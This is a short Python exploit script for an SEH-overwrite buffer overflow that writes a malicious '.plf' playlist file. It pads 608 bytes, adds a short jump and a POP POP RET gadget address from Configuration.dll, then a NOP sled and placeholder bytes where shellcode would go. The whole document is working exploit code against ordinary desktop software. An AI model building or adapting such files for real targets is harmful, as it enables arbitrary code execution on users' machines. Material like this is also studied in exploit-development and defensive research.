#0x6034023c : pop edi # pop ebx # ret 0x04 |  [Configuration.dll]
#jmp+8 EB 06
#612-4 to account for SE Handler
buffer = "A"*608 +"\xeb\x06\x90\x90" + "\x3c\x02\x34\x60" + "\x90"*20 + "X"*250
f = open('5.plf','w')
f.write(buffer)
f.close()
